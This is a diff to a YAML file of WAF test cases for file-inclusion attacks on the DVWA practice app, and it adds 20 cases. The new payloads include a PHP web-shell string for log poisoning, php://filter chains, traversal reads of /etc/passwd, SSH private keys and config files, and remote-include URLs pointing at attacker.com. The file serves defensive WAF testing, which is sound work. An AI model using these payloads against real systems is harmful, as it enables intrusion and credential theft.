@@ -2,12 +2,12 @@
 # File Inclusion (LFI/RFI) Test Cases
 # =============================================================================
 # DVWA의 File Inclusion 취약점을 통해 WAF의 Local/Remote File Inclusion
-# 탐지 능력을 검증합니다.
+# 탐지 능력을 검증합니다. PHP Wrapper, Log Poisoning 등 40케이스
 # =============================================================================
 
 category: "file_inclusion"
 name: "File Inclusion"
-description: "Local/Remote File Inclusion 공격 탐지 테스트"
+description: "Local/Remote File Inclusion 공격 탐지 테스트 (확장판 40케이스)"
 severity: "high"
 icon: "📂"
 
@@ -207,3 +207,172 @@ tests:
     params:
       page: "../../../.git/config"
     severity: "high"
+
+  # ======== [신규 확장: +20 케이스] ========
+
+  # --- Log Poisoning (로그 주입을 통한 RCE) ---
+  - id: "lfi-021"
+    description: "Log Poisoning - Apache access.log PHP 주입"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "<?php system($_GET['cmd']); ?>"
+    severity: "critical"
+
+  - id: "lfi-022"
+    description: "Log Poisoning - sshd 로그 주입"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../var/log/auth.log"
+    severity: "critical"
+
+  - id: "lfi-023"
+    description: "Log Poisoning - /proc/self/fd/ 로그파일"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../proc/self/fd/7"
+    severity: "high"
+
+  # --- PHP Wrapper 고급 ---
+  - id: "lfi-024"
+    description: "LFI - php://filter 문자열 인코딩 체인"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "php://filter/convert.base64-encode|convert.base64-decode/resource=index.php"
+    severity: "high"
+
+  - id: "lfi-025"
+    description: "LFI - php://filter zlib.deflate"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "php://filter/zlib.deflate/convert.base64-encode/resource=../../../etc/passwd"
+    severity: "high"
+
+  - id: "lfi-026"
+    description: "LFI - php://filter iconv 변환"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd"
+    severity: "high"
+
+  - id: "lfi-027"
+    description: "LFI - php://filter strip_tags"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "php://filter/string.strip_tags/resource=../../../etc/passwd"
+    severity: "medium"
+
+  # --- Session File Inclusion ---
+  - id: "lfi-028"
+    description: "LFI - PHP 세션 파일 포함"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../var/lib/php/sessions/sess_"
+    severity: "critical"
+
+  - id: "lfi-029"
+    description: "LFI - PHP 세션 파일 (tmpfs)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../tmp/sess_"
+    severity: "high"
+
+  # --- /proc filesystem ---
+  - id: "lfi-030"
+    description: "LFI - /proc/self/cmdline"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../proc/self/cmdline"
+    severity: "medium"
+
+  - id: "lfi-031"
+    description: "LFI - /proc/self/status"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../proc/self/status"
+    severity: "medium"
+
+  - id: "lfi-032"
+    description: "LFI - /proc/self/cwd/ (현재 디렉토리)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../proc/self/cwd/index.php"
+    severity: "medium"
+
+  # --- 웹 서버 설정 파일 ---
+  - id: "lfi-033"
+    description: "LFI - /etc/apache2/.htaccess"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/apache2/.htaccess"
+    severity: "high"
+
+  - id: "lfi-034"
+    description: "LFI - /etc/apache2/ports.conf"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/apache2/ports.conf"
+    severity: "high"
+
+  - id: "lfi-035"
+    description: "LFI - /etc/php/apache2/php.ini"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/php/apache2/php.ini"
+    severity: "high"
+
+  - id: "lfi-036"
+    description: "LFI - /etc/mysql/my.cnf"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../etc/mysql/my.cnf"
+    severity: "high"
+
+  # --- SSH 키 노출 ---
+  - id: "lfi-037"
+    description: "LFI - /home/www-data/.ssh/id_rsa"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../home/www-data/.ssh/id_rsa"
+    severity: "critical"
+
+  - id: "lfi-038"
+    description: "LFI - /root/.ssh/authorized_keys"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "../../../root/.ssh/authorized_keys"
+    severity: "critical"
+
+  # --- RFI 고급 ---
+  - id: "rfi-005"
+    description: "RFI - SMB 공유 (Windows)"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "\\\\attacker.com\\share\\evil.php"
+    severity: "critical"
+
+  - id: "rfi-006"
+    description: "RFI - SFTP 프로토콜"
+    method: "GET"
+    path: "/vulnerabilities/fi/"
+    params:
+      page: "sftp://attacker.com:22/shell.php"
+    severity: "critical"
